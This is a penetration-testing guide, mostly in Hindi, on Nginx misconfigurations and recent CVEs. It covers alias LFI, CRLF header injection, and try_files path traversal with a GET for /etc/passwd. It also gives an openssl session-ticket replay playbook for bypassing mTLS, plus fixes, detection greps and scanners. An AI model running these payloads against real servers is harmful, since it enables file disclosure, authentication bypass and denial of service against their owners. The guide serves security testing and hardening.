# Nginx

{{#include ../../banners/hacktricks-training.md}}


## रूट स्थान गायब <a href="#missing-root-location" id="missing-root-location"></a>

जब Nginx सर्वर को कॉन्फ़िगर किया जा रहा हो, तो **root directive** एक महत्वपूर्ण भूमिका निभाता है क्योंकि यह उस बेस डायरेक्टरी को परिभाषित करता है जहाँ से फाइलें सर्व की जाती हैं। नीचे दिए गए उदाहरण पर विचार करें:
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
In this configuration, `/etc/nginx` is designated as the root directory. This setup allows access to files within the specified root directory, such as `/hello.txt`. However, it's crucial to note that only a specific location (`/hello.txt`) is defined. There's no configuration for the root location (`location / {...}`). This omission means that the root directive applies globally, enabling requests to the root path `/` to access files under `/etc/nginx`.

एक महत्वपूर्ण सुरक्षा विचार इस कॉन्फ़िगरेशन से उत्पन्न होता है। एक साधारण `GET` अनुरोध, जैसे `GET /nginx.conf`, संवेदनशील जानकारी उजागर कर सकता है क्योंकि यह `/etc/nginx/nginx.conf` पर स्थित Nginx कॉन्फ़िगरेशन फ़ाइल को सर्व कर सकता है। root को कम संवेदनशील डायरेक्टरी जैसे `/etc` पर सेट करने से इस जोखिम को कम किया जा सकता है, फिर भी यह अन्य महत्वपूर्ण फ़ाइलों तक अनचाहे पहुँच की अनुमति दे सकता है, जिनमें अन्य कॉन्फ़िगरेशन फ़ाइलें, access logs, और यहां तक कि HTTP basic authentication के लिए उपयोग किए गए encrypted credentials भी शामिल हैं।

## Alias LFI Misconfiguration <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

In the configuration files of Nginx, a close inspection is warranted for the "location" directives. A vulnerability known as Local File Inclusion (LFI) can be inadvertently introduced through a configuration that resembles the following:
```
location /imgs {
alias /path/images/;
}
```
यह configuration LFI attacks के लिए प्रवण है क्योंकि server `/imgs../flag.txt` जैसे requests को intended directory के बाहर फ़ाइलों तक पहुँचने के प्रयास के रूप में interpret करता है, जो प्रभावी रूप से `/path/images/../flag.txt` पर resolve होता है। यह कमजोरी attackers को server के filesystem से वे फ़ाइलें retrieve करने की अनुमति देती है जो web के माध्यम से accessible नहीं होनी चाहिए।

इस कमजोरी को कम करने के लिए, configuration को निम्नानुसार समायोजित किया जाना चाहिए:
```
location /imgs/ {
alias /path/images/;
}
```
अधिक जानकारी: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Accunetix परीक्षण:
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## असुरक्षित पथ प्रतिबंध <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

इन निर्देशों को bypass करने का तरीका जानने के लिए निम्नलिखित पृष्ठ देखें:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## Unsafe variable use / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> Vulnerable variables `$uri` और `$document_ur`i हैं, और इसे `$request_uri` से बदलकर ठीक किया जा सकता है।
>
> एक regex भी निम्न तरह vulnerable हो सकता है:
>
> `location ~ /docs/([^/])? { … $1 … }` - Vulnerable
>
> `location ~ /docs/([^/\s])? { … $1 … }` - Not vulnerable (checking spaces)
>
> `location ~ /docs/(.*)? { … $1 … }` - Not vulnerable

Nginx कॉन्फ़िगरेशन में एक भेद्यता नीचे दिए गए उदाहरण में दर्शाई गई है:
```
location / {
return 302 https://example.com$uri;
}
```
HTTP अनुरोधों में वर्ण `\r` (Carriage Return) और `\n` (Line Feed) नई लाइन कैरेक्टर संकेत करते हैं, और उनके URL-encoded रूप `%0d%0a` के रूप में होते हैं। इन कैरेक्टरों को एक अनुरोध में शामिल करने पर (उदा., `http://localhost/%0d%0aDetectify:%20clrf`) किसी misconfigured server में सर्वर एक नया हेडर जारी करता है जिसका नाम `Detectify` होता है। यह इसलिए होता है क्योंकि `$uri` वेरिएबल URL-encoded नई लाइन कैरेक्टरों को डिकोड करता है, जिसके परिणामस्वरूप प्रतिक्रिया में एक अप्रत्याशित हेडर होता है:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
CRLF injection और response splitting के जोखिमों के बारे में अधिक जानकारी के लिए देखें: [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).

इसके अलावा यह तकनीक [**explained in this talk**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77) कुछ vulnerable examples और detection mechanisms के साथ समझाई गई है। उदाहरण के लिए, इस misconfiguration का blackbox दृष्टिकोण से पता लगाने के लिए आप ये requests कर सकते हैं:

- `https://example.com/%20X` - Any HTTP code
- `https://example.com/%20H` - 400 Bad Request

यदि vulnerable है, तो पहली request प्रतिक्रिया देगी क्योंकि "X" किसी भी HTTP method हो सकता है और दूसरी request error देगी क्योंकि H एक valid method नहीं है। इसलिए server को कुछ इस तरह प्राप्त होगा: `GET / H HTTP/1.1` और इससे error ट्रिगर होगा।

अन्य detection उदाहरण इस प्रकार हो सकते हैं:

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - Any HTTP code
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

उस talk में प्रस्तुत कुछ पाए गए vulnerable configurations इस प्रकार थे:

- Note how **`$uri`** is set as is in the final URL
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- ध्यान दें कि फिर से **`$uri`** URL में है (इस बार एक parameter के अंदर)
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- अब AWS S3 में
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### कोई भी वैरिएबल

यह पाया गया कि **user-supplied data** कुछ परिस्थितियों में **Nginx variable** के रूप में व्यवहार की जा सकती है। इस व्यवहार का कारण कुछ हद तक अस्पष्ट है, फिर भी यह न तो दुर्लभ है और न ही आसानी से सत्यापित किया जा सकता है। इस अनोमली को HackerOne पर एक security report में उजागर किया गया था, जिसे [here](https://hackerone.com/reports/370094) देखा जा सकता है। त्रुटि संदेश की आगे की जांच ने इसे [SSI filter module of Nginx's codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365) में स्थित पाया, और Server Side Includes (SSI) को मूल कारण के रूप में चिन्हित किया गया।

इस **गलत कॉन्फ़िगरेशन का पता लगाने** के लिए, निम्नलिखित command चलाया जा सकता है, जिसमें variable printing की जांच करने के लिए एक referer header सेट करना शामिल है:
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
सिस्टमों में इस गलत कॉन्फ़िगरेशन के लिए किए गए स्कैन में कई उदाहरण मिले जहाँ उपयोगकर्ता Nginx variables को प्रिंट कर सकता था। हालाँकि, कमजोर उदाहरणों की संख्या में कमी से पता चलता है कि इस समस्या को पैच करने के प्रयास कुछ हद तक सफल रहे हैं।

### try_files के साथ $URI$ARGS variables का उपयोग

निम्नलिखित Nginx गलत कॉन्फ़िगरेशन एक LFI vulnerability का कारण बन सकता है:
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
हमारी configuration में `try_files` डायरेक्टिव है जिसका उपयोग निर्दिष्ट क्रम में फ़ाइलों के अस्तित्व की जांच करने के लिए किया जाता है। Nginx पहले मिलने वाली फ़ाइल को serve करेगा। `try_files` डायरेक्टिव का बेसिक सिंटैक्स इस प्रकार है:
```
try_files file1 file2 ... fileN fallback;
```
Nginx निर्दिष्ट क्रम में प्रत्येक फ़ाइल के अस्तित्व की जाँच करेगा। अगर कोई फ़ाइल मौजूद है, तो उसे तुरंत सर्व किया जाएगा। अगर निर्दिष्ट कोई भी फ़ाइल मौजूद नहीं है, तो अनुरोध fallback विकल्प को भेज दिया जाएगा, जो किसी अन्य URI या किसी विशिष्ट error page हो सकता है।

हालाँकि, जब इस निर्देश में `$uri$args` वेरिएबल का उपयोग किया जाता है, तो Nginx उस फ़ाइल को खोजने की कोशिश करेगा जो अनुरोधित URI को किसी भी query string arguments के साथ मिलाकर मेल खाती हो। इसलिए हम इस कॉन्फ़िगरेशन का शोषण कर सकते हैं:
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
निम्नलिखित payload के साथ:
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
Using our payload हम root directory (defined in Nginx configuration) से बाहर निकलकर `/etc/passwd` फ़ाइल लोड करेंगे। debug logs में हम देख सकते हैं कि Nginx फ़ाइलों को कैसे आज़माता है:
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
PoC against Nginx ऊपर दी गई configuration का उपयोग करते हुए:
![उदाहरण burp अनुरोध](../../images/nginx_try_files.png)

## Raw backend response पढ़ना

Nginx `proxy_pass` के माध्यम से एक फीचर प्रदान करता है जो backend द्वारा उत्पन्न त्रुटियों और HTTP headers को intercept करने की अनुमति देता है, ताकि internal error messages और headers छुपाए जा सकें। यह Nginx द्वारा backend त्रुटियों के जवाब में custom error pages serve करके किया जाता है। हालाँकि, समस्याएँ उत्पन्न होती हैं जब Nginx को एक invalid HTTP request मिलती है। ऐसी request जैसा प्राप्त हुई उसे backend को आगे भेज दी जाती है, और backend की raw response सीधे क्लाइंट को भेज दी जाती है बिना Nginx के हस्तक्षेप के।

uWSGI application वाला एक उदाहरण परिदृश्य पर विचार करें:
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
इसे प्रबंधित करने के लिए, Nginx कॉन्फ़िगरेशन में विशिष्ट निर्देशों का उपयोग किया जाता है:
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors): यह निर्देश Nginx को backend प्रतिक्रियाओं के लिए कस्टम प्रतिक्रिया देने में सक्षम बनाता है जिनका status code 300 से अधिक हो। यह सुनिश्चित करता है कि हमारे उदाहरण uWSGI application के लिए `500 Error` प्रतिक्रिया को Nginx द्वारा इंटरसेप्ट और हैंडल किया जाए।
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header): नाम से ही स्पष्ट है कि यह निर्देश क्लाइंट से निर्दिष्ट HTTP हेडर्स छुपाता है, जिससे गोपनीयता और सुरक्षा बढ़ती है।

जब एक वैध `GET` request किया जाता है, Nginx इसे सामान्य रूप से प्रोसेस करता है और किसी भी गुप्त हेडर्स को प्रकट किए बिना एक मानक error response वापस करता है। हालांकि, एक अवैध HTTP request इस मैकेनिज़्म को बाईपास कर देता है, जिसके परिणामस्वरूप कच्ची बैकएंड प्रतिक्रियाएँ, जिनमें गुप्त हेडर्स और त्रुटि संदेश शामिल हैं, उजागर हो जाते हैं।

## merge_slashes set to off

By default, Nginx's **`merge_slashes` directive** is set to **`on`**, which compresses multiple forward slashes in a URL into a single slash. This feature, while streamlining URL processing, can inadvertently conceal vulnerabilities in applications behind Nginx, particularly those prone to local file inclusion (LFI) attacks. Security experts **Danny Robinson and Rotem Bar** have highlighted the potential risks associated with this default behavior, especially when Nginx acts as a reverse-proxy.

ऐसे जोखिमों को कम करने के लिए, संवेदनशील applications के लिए यह सुझाव दिया जाता है कि **`merge_slashes` directive को off कर दिया जाए**। इससे Nginx अनुरोधों को URL संरचना में परिवर्तन किए बिना एप्लिकेशन तक फ़ॉरवर्ड करता है, और इस प्रकार अंतर्निहित सुरक्षा समस्याओं को छुपने नहीं देता।

अधिक जानकारी के लिए देखें [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d).

### **Maclicious Response Headers**

As shown in [**this writeup**](https://mizu.re/post/cors-playground), there are certain headers that if present in the response from the web server they will change the behaviour of the Nginx proxy. You can check them [**in the docs**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/):

- `X-Accel-Redirect`: Nginx को बताता है कि वह अनुरोध को आंतरिक रूप से एक निर्दिष्ट स्थान पर पुनर्निर्देशित करे।
- `X-Accel-Buffering`: नियंत्रित करता है कि Nginx को प्रतिक्रिया को buffer करना चाहिए या नहीं।
- `X-Accel-Charset`: X-Accel-Redirect का उपयोग करते समय प्रतिक्रिया के लिए character set सेट करता है।
- `X-Accel-Expires`: X-Accel-Redirect का उपयोग करते समय प्रतिक्रिया के लिए समाप्ति समय सेट करता है।
- `X-Accel-Limit-Rate`: X-Accel-Redirect का उपयोग करते समय प्रतिक्रियाओं के लिए transfer rate को सीमित करता है।

उदाहरण के लिए, हेडर **`X-Accel-Redirect`** nginx में एक आंतरिक **redirect** का कारण बनता है। इसलिए यदि nginx कॉन्फ़िगरेशन में कुछ ऐसा है जैसे **`root /`** और वेब सर्वर की प्रतिक्रिया में **`X-Accel-Redirect: .env`** है, तो nginx **`/.env`** की सामग्री भेजेगा (Path Traversal).

### **Default Value in Map Directive**

In the **Nginx configuration**, the `map` directive often plays a role in **authorization control**. A common mistake is not specifying a **default** value, which could lead to unauthorized access. For instance:
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
यदि `default` नहीं है, तो एक **दुष्ट उपयोगकर्ता** `/map-poc` के भीतर एक **परिभाषित नहीं किया गया URI** तक पहुँचकर सुरक्षा को बायपास कर सकता है। [The Nginx manual](https://nginx.org/en/docs/http/ngx_http_map_module.html) ऐसे मामलों से बचने के लिए **डिफ़ॉल्ट मान** सेट करने की सलाह देता है।

### **DNS Spoofing Vulnerability**

DNS spoofing against Nginx निश्चित परिस्थितियों में संभव है। यदि कोई हमलावर जानता है कि Nginx किस **DNS server** का उपयोग कर रहा है और उसके DNS क्वेरीज़ को इंटरसेप्ट कर सकता है, तो वह DNS रिकॉर्ड्स को spoof कर सकता है। हालांकि, यह तरीका अप्रभावी है यदि Nginx को DNS resolution के लिए **localhost (127.0.0.1)** का उपयोग करने के लिए कॉन्फ़िगर किया गया हो। Nginx निम्नानुसार एक DNS server निर्दिष्ट करने की अनुमति देता है:
```yaml
resolver 8.8.8.8;
```
### **`proxy_pass` और `internal` निर्देश**

**`proxy_pass`** निर्देश का उपयोग अनुरोधों को अन्य सर्वरों पर रीडायरेक्ट करने के लिए किया जाता है, आंतरिक या बाह्य दोनों तरह से। **`internal`** निर्देश सुनिश्चित करता है कि कुछ लोकेशन केवल Nginx के भीतर ही सुलभ हों। हालाँकि ये निर्देश स्वयं में कमज़ोरियाँ नहीं हैं, उनकी कॉन्फ़िगरेशन को सुरक्षा चूक रोकने के लिए सावधानी से जांचना आवश्यक है।

## proxy_set_header Upgrade & Connection

यदि nginx सर्वर Upgrade और Connection headers पास करने के लिए कॉन्फ़िगर है, तो एक [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md) करके protected/internal endpoints तक पहुँच प्राप्त की जा सकती है।

> [!CAUTION]
> यह कमज़ोरी एक हमलावर को **`proxy_pass` endpoint` के साथ एक direct connection स्थापित करने** की अनुमति देगी (`http://backend:9999` इस मामले में) जिसका content nginx द्वारा जाँचा नहीं जाएगा।

Example of vulnerable configuration to steal `/flag` from [here](https://bishopfox.com/blog/h2c-smuggling-request):
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> ध्यान दें कि भले ही `proxy_pass` किसी विशिष्ट **path** जैसे `http://backend:9999/socket.io` की ओर इशारा कर रहा हो, कनेक्शन `http://backend:9999` के साथ स्थापित होगा, इसलिए आप उस internal endpoint के किसी भी अन्य path से संपर्क कर सकते हैं। इसलिए proxy_pass के URL में path निर्दिष्ट होने से कोई फर्क नहीं पड़ता। 

## HTTP/3 QUIC module remote DoS & leak (2024)

2024 के दौरान Nginx ने CVE-2024-31079, CVE-2024-32760, CVE-2024-34161 और CVE-2024-35200 प्रकाशित किए, जो दर्शाते हैं कि एक **single hostile QUIC session** worker processes को crash कर सकती है या memory को leak कर सकती है जब experimental `ngx_http_v3_module` compile किया गया हो और एक `listen ... quic` socket expose किया गया हो। प्रभावित builds 1.25.0–1.25.5 और 1.26.0 हैं, जबकि 1.27.0/1.26.1 fixes के साथ आते हैं; memory disclosure (CVE-2024-34161) के लिए अतिरिक्त रूप से 4096 bytes से बड़े MTUs की आवश्यकता है ताकि sensitive data surface हो (विवरण नीचे दिए गए 2024 nginx advisory में)।

**Recon & exploitation hints**

- HTTP/3 opt-in है, इसलिए `Alt-Svc: h3=":443"` responses के लिए scan करें या UDP/443 पर QUIC handshakes को brute-force करें; पुष्टि होने पर custom `quiche-client`/`nghttp3` payloads के साथ handshake और STREAM frames को fuzz करके worker crashes और log leakage को trigger करें।
- Target support को जल्दी से fingerprint करने के लिए:
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## TLS session resumption bypass of client cert auth (CVE-2025-23419)

फरवरी 2025 की एक advisory में बताया गया कि OpenSSL के साथ बिल्ट nginx 1.11.4–1.27.3 एक name-based virtual host से **reusing a TLS 1.3 session** को दूसरे में अनुमति देता है, इसलिए कोई क्लाइंट जिसने certificate-free host के साथ नेगोशिएशन किया हो, वह ticket/PSK को रिप्ले कर सकता है और `ssl_verify_client on;` से सुरक्षित vhost में घुस सकता है और mTLS को पूरी तरह बाईपास कर सकता है। यह बग तब ट्रिगर होता है जब कई virtual hosts एक ही TLS 1.3 session cache और tickets साझा करते हैं (नीचे संदर्भित 2025 nginx advisory देखें)।

**Attacker playbook**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
यदि लक्ष्य कमजोर है, तो दूसरा हैंडशेक क्लाइंट प्रमाणपत्र प्रस्तुत किए बिना पूरा हो जाता है, और संरक्षित स्थान उजागर हो जाते हैं।

**क्या ऑडिट करें**

- ऐसे मिश्रित `server_name` ब्लॉक्स जो `ssl_session_cache shared:SSL` और `ssl_session_tickets on;` साझा करते हैं।
- ऐसे Admin/API ब्लॉक्स जो mTLS की अपेक्षा करते हैं लेकिन सार्वजनिक होस्ट्स से साझा session cache/ticket सेटिंग्स विरासत में प्राप्त करते हैं।
- ऐसी Automation जो TLS 1.3 session resumption को वैश्विक रूप से सक्षम करती है (उदा., Ansible roles) बिना vhost isolation पर विचार किए।

## HTTP/2 Rapid Reset प्रतिरोध (CVE-2023-44487 व्यवहार)

The HTTP/2 Rapid Reset attack (CVE-2023-44487) तब भी nginx को प्रभावित करता है जब ऑपरेटर `keepalive_requests` या `http2_max_concurrent_streams` को डिफ़ॉल्ट से अधिक सेट कर देते हैं: एक attacker एक HTTP/2 कनेक्शन खोलता है, उसे हजारों streams से भर देता है, फिर तुरंत `RST_STREAM` फ्रेम जारी करता है ताकि concurrency ceiling कभी न पहुंचे जबकि CPU tear-down logic पर काम करते रहे। Nginx defaults (128 concurrent streams, 1000 keepalive requests) blast radius को छोटा रखते हैं; उन सीमाओं को "काफी अधिक" बढ़ाने से एक ही क्लाइंट से भी workers को संसाधनहीन कर देना trivial हो जाता है (नीचे संदर्भित F5 write-up देखें)।

**डिटेक्शन टिप्स**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
जो होस्ट्स उन निर्देशों के लिए असामान्य रूप से उच्च मान प्रकट करते हैं वे प्रमुख लक्ष्य होते हैं: एक HTTP/2 क्लाइंट stream बनाने और तुरंत `RST_STREAM` फ्रेम भेजने का लूप चला सकता है जिससे CPU सतत उच्च पर बनी रहे बिना concurrency cap ट्रिप हुए।

## खुद करके आज़माएँ

Detectify ने एक GitHub repository बनाई है जहाँ आप Docker का उपयोग करके इस लेख में चर्चा किए गए कुछ misconfigurations वाले अपने स्वयं के vulnerable Nginx टेस्ट सर्वर को सेटअप कर सकते हैं और उन्हें खुद ढूँढकर आज़मा सकते हैं!

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## Static Analyzer tools

### [gixy-ng](https://github.com/dvershinin/gixy) & [GixyNG](https://github.com/megamansec/gixyng) & [GIXY](https://github.com/yandex/gixy)


- [GixyNG](https://github.com/megamansec/gixyng) (GIXY का एक अपडेटेड fork) एक टूल है जो Nginx configurations का विश्लेषण करता है, जिसका उद्देश्य vulnerabilities, insecure directives और risky misconfigurations खोजना है। यह performance को प्रभावित करने वाले misconfigurations भी ढूँढता है और छोड़े गए hardening अवसरों का पता लगाता है, जिससे automated flaw detection संभव होता है।
- [gixy-ng](https://github.com/dvershinin/gixy) (GIXY का सक्रिय रूप से मेंटेन किया गया fork) एक टूल है जो Nginx configurations का विश्लेषण करता है, जिसका उद्देश्य vulnerabilities, insecure directives और risky misconfigurations खोजना है। यह performance को प्रभावित करने वाले misconfigurations भी ढूँढता है और छोड़े गए hardening अवसरों का पता लगाता है, जिससे automated flaw detection संभव होता है।

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Nginxpwner एक सरल टूल है जो सामान्य Nginx misconfigurations और vulnerabilities खोजने के लिए उपयोग होता है।

## References

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
